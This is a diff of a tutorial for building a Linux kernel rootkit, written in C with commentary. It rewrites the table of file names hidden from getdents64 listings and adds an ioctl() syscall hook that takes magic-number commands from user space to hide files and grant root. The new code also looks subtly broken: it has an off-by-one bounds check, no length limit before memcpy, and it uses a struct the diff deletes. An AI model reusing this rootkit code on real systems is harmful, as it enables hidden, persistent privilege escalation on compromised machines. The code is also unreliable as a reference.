@@ -338,54 +338,40 @@ static int hack_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent
 There are some auxilary functions and data structures to help with the function, both are simple so I will ignore them.
 
 ```c
-// cloak file related struct
-struct cloak_file_cmd{
-    char name[MAX_CLOAK_FILE_NAME_LEN];
+struct cloak_ent{
+    unsigned int name_len;
+    char name_buf[MAX_CLOAK_FILE_NAME_LEN];
 };
 
-struct cloak_ent{
-    unsigned short buf_start;
-    unsigned char name_len;
-};
 
 static int add_cloak_file_name(char* name){
-    int i_buf;
+    int name_len;
     int i_ent;
-    unsigned long name_len;
-    // find a empty entry in cloak_ent_array
+
+    name_len = strlen(name);
     for(i_ent=0;i_ent<MAX_CLOAK_FILE_COUNT;i_ent++){
         if(!cloak_ent_array[i_ent].name_len) break;
     }
-    if(i_ent==MAX_CLOAK_FILE_COUNT && cloak_ent_array[i_ent].buf_start) return -1;  // cloak_ent_array full
+    if(i_ent == MAX_CLOAK_FILE_COUNT-1 && cloak_ent_array[i_ent].name_len) return -1; // too many files to fide
 
-    // find the tail of cloak_file_name_buf
-    for(i_buf=0;i_buf<CLOAK_NAME_BUF_LEN;i_buf++){
-        if(!cloak_file_name_buf[i_buf]) break;
-    }
-    if(i_buf==CLOAK_NAME_BUF_LEN) return -2;    // cloak_file_name_buf full
-
-    // write the cloak file name to cloak_file_name_buf
-    name_len = strlen(name);
-    if(name_len > MAX_CLOAK_FILE_NAME_LEN) return -3;   // file name to cloak too long
-    if(!memcpy(&cloak_file_name_buf[i_buf], name, name_len)) return -4; // write file name failed
-
-    // write the cloak_ent_array
-    cloak_ent_array[i_ent].buf_start = i_buf;
-    cloak_ent_array[i_ent].name_len = (unsigned char)name_len;
-    return 1;
+    memset((char*)&cloak_ent_array[i_ent].name_buf, 0, name_len);
+    memcpy((char*)&cloak_ent_array[i_ent].name_buf, name, name_len);
+    cloak_ent_array[i_ent].name_len = name_len;
+    return i_ent;
 }
 
-static unsigned int is_file_cloaked(char* name){
+
+static int is_file_cloaked(char* name){
     unsigned int name_len = strlen(name);
     int i_ent;
     for(i_ent=0;i_ent<MAX_CLOAK_FILE_COUNT;i_ent++){
         if(cloak_ent_array[i_ent].name_len == name_len){
-            if(strnstr(&cloak_file_name_buf[cloak_ent_array[i_ent].buf_start], name, name_len)){
-                return 1;
+            if(!strcmp((char*)&cloak_ent_array[i_ent].name_buf, name)){
+                return i_ent;
             }
         }
     }
-    return 0;
+    return -1;
 }
 ```
 
@@ -533,7 +519,49 @@ and it will be a root one;
 
 
 
-​	
+## 3. hook *ioctl()*
+
+It's a common trick in rootkit to hook the *ioctl()* syscall to pass command to the rootkit from user space after it gets load into the kernel. The design is simple:
+
+1. we hook the *ioctl()* syscall, forward the normal syscalls to the real *ioctl()*, and at the same time:
+2. we define a magic magic for our rootkit operation and our *ioctl()* hook function will recognize it and do the corresponding operations for us. And we need to define some structs to pass to the rootkit to tell it what we want to do and how it should be done
+3. the struct we pass to the rootkit should contain a magic number to ensure we are indeed intercepting a command for the rootkit. The struct is mainly for passing execution parameters to the rootkit, like the file name we want to hide. Be aware that the only argument we can pass to the kernel module using *ioctl()* is a pointer, and generally it points to the user space. So before we dereferrencing the parameters in the struct fields, we need to copy it to kernel space with *copy_from_user()*
+
+The implementation is as follows
+
+```c
+static int hack_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg){
+    if(cmd == ROOTKIT_IOCTL_MAGIC){
+        struct rootkit_cmd cmd;
+        copy_from_user(&cmd, (void*)arg, sizeof(struct rootkit_cmd));   // the arg points to user space, copy it to kernel space
+        if(cmd.magic_head == ROOTKIT_CMD_MAGIC_HEAD && cmd.magic_tail == ROOTKIT_CMD_MAGIC_TAIL){
+            switch(cmd.cmd_id){
+                case ROOTKIT_CMD_ID_HIDEFILE:{
+                    struct cloak_file_cmd cfc;
+                    copy_from_user(&cfc, (void*)cmd.real_arg, sizeof(struct cloak_file_cmd));
+                    return add_cloak_file_name((char*)&cfc.name);
+                }
+                case ROOTKIT_CMD_ID_GETROOT:{
+                    printk("[+] rootkit: getroot() called\n");
+                    return hack_getroot();
+                }
+                case ROOTKIT_CMD_ID_TEST:{
+                    printk("[+] work correctly\n");
+                    return 1;
+                }
+            }
+        }
+    }
+    return (*real_ioctl)(fd, cmd, arg);
+}
+
+```
+
+
+
+The *hack_ioctl()* function will be frequently modified due to new functions adding to the rootkit. The changes will be trivial and will not be mentioned unless neccessary.
+
+
 
 # Reference
 
